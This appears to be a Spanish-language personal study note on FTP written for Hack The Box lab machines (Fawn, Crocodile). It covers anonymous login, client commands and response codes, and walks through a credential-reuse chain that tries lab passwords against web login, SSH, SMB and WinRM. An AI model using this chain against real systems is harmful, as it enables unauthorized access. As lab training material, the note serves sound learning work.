---
tags: [ftp]
---

> **FTP** transfiere archivos sobre TCP en dos canales: **control** (puerto 21) y **datos** (puerto 20 o negociado). Esta guía cubre lo que hemos practicado.

---

## Quickstart — Anonymous Login

```bash
$ ftp 10.129.1.10
Name: anonymous
Password: <cualquier cosa o Enter>
ftp> ls
ftp> get flag.txt
ftp> quit
```

**Prueba toggling passive mode si el servidor rechaza tu data connection:**
```bash
ftp> passive
```

---

## Comandos esenciales del cliente

| Comando | Qué hace |
| :------ | :------ |
| `open <host>` | Conectar a un servidor FTP |
| `ls` / `dir` | Listar archivos |
| `cd <path>` | Cambiar de directorio |
| `pwd` | Mostrar directorio actual |
| `get <file>` | Descargar un archivo |
| `mget *.txt` | Descargar múltiples archivos |
| `passive` | Toggle passive mode on/off |
| `binary` | Cambiar a modo binario |
| `quit` / `bye` | Desconectar |

---

## Anonymous FTP → Cadena de Credential Reuse

Anonymous FTP suele ser el **primer paso** en una cadena de ataque multi-servicio. Cuando encuentras archivos legibles, prueba inmediatamente las credenciales descubiertas contra todos los demás servicios (SSH, paneles web, SMB, WinRM).

### Cadena clásica (de HTB Crocodile)

```
Anonymous FTP → descargar listas user/password → Gobuster encuentra login oculto → credential reuse → admin panel
```

**Paso 1 — Descargar todo del FTP anónimo:**
```bash
$ ftp 10.129.1.15
Name: anonymous
Password: <Enter>
ftp> passive
ftp> ls
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> quit
```

**Paso 2 — Emparejar credenciales (línea por línea):**
```bash
$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin

$ cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd

# Línea 4 users[4] + passwords[4] → admin:rKXM59ESxesUFHAd
```

**Paso 3 — Probar contra cada otro servicio:**
```bash
# Web login form (el vector real en Crocodile)
curl -d 'user=admin&pass=rKXM59ESxesUFHAd' http://10.129.1.15/login.php -L -v

# SSH
ssh admin@10.129.1.15

# SMB
smbclient -L 10.129.1.15 -U 'admin%rKXM59ESxesUFHAd'

# WinRM (si puerto 5985 está abierto)
evil-winrm -i 10.129.1.15 -u admin -p 'rKXM59ESxesUFHAd'
```

> 💡 **Key insight:** Archivos llamados `allowed.userlist` y `allowed.userlist.passwd` en el root de FTP son una señal clara de credential reuse. Siempre descarga **ambos** archivos juntos y prueba cada par username/password.

---

## Useful Nmap Scripts

```bash
# Verificar acceso anónimo + listar archivos
nmap --script ftp-anon -p21 10.129.1.10

# Service + version detection
nmap -sV -p21 10.129.1.10
```

---

## vsftpd Notes

- **vsftpd** — "Very Secure FTP Daemon", muy común en Linux
- El acceso anónimo depende de `anonymous_enable=YES` en `/etc/vsftpd.conf`
- Lo vimos en: **Fawn** (flag directa en root), **Crocodile** (listas user/password → web login)

---

## Response Codes — Los que verás

| Code | Significado |
| :--- | :---------- |
| **220** | Servicio listo |
| **227** | Entrando en Passive Mode |
| **230** | Login exitoso ✅ |
| **331** | Username OK, necesita password |
| **425** | No se puede abrir data connection (prueba `passive`) |
| **530** | Not logged in |

---

## 🔗 Related

**Machines:** [[🦌 Fawn]], [[🐊 Crocodile]]

**Guides:** [[💣 Gobuster]], [[🐬 MySQL]]

---

## References

- [RFC 959](https://tools.ietf.org/html/rfc959) — FTP Standard
- [vsftpd](https://security.appspot.com/vsftpd.html)
